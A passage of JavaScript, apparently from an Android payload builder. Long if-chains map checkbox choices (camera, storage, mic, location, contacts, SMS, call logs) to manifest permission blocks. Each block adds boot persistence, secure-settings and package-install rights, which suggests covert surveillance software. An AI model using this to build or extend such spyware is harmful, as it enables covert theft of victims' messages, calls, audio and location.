            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>         `
        }
        //if two are checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         `
        }


        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>         `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>         `
        }

        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_CALL_LOG"/>
            <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
        if (checkBoxofCamera.checked == false && checkBoxofStorage.checked == false && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == true && checkBoxofCallsLogs.checked == true) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.READ_SMS"/>
            <uses-permission android:name="android.permission.SEND_SMS"/>
            <uses-permission android:name="android.permission.RECEIVE_SMS"/>
            <uses-permission android:name="android.permission.WRITE_SMS"/>
            <uses-permission android:name="android.permission.READ_CONTACTS"/>

            `
        }
        //if three are checked
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == true && checkBoxofLocation.checked == false && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.RECORD_AUDIO"/>
            <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>

            `
        }

        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == true && checkBoxofContacts.checked == false && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
            <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
            <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
            <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>         `
        }
        if (checkBoxofCamera.checked == true && checkBoxofStorage.checked == true && checkBoxofMic.checked == false && checkBoxofLocation.checked == false && checkBoxofContacts.checked == true && checkBoxofSms.checked == false && checkBoxofCallsLogs.checked == false) {
            var Permissionsrules = `
            <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
            <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
            <uses-permission android:name="android.permission.WAKE_LOCK"/>
            <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
            <uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>
            <uses-permission android:name="android.permission.INTERNET"/>
            <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
            <uses-permission android:name="android.permission.INSTALL_PACKAGE"/>
            <uses-permission android:name="android.permission.CAMERA"/>
            <uses-feature android:name="android.hardware.camera"/>
            <uses-feature android:name="android.hardware.camera.autofocus"/>
